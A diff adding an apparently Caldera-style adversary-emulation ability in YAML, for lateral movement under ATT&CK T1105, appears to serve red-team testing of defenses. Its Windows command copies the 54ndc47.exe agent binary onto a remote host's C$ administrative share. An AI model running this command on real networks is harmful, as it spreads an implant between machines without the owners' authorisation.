@@ -1,0 +1,14 @@
+---
+
+- id: cdfa9d5b-571c-452e-bd0e-8d192a106799
+  name: Share 54ndc47
+  description: Adds 54ndc47 to a network share/mount
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
+  executors:
+    windows:
+      command: |
+        cmd /c copy #{files}\54ndc47.exe \\#{remote.network.ip}\c$\54ndc47.exe
+      payload: sandcat.exe
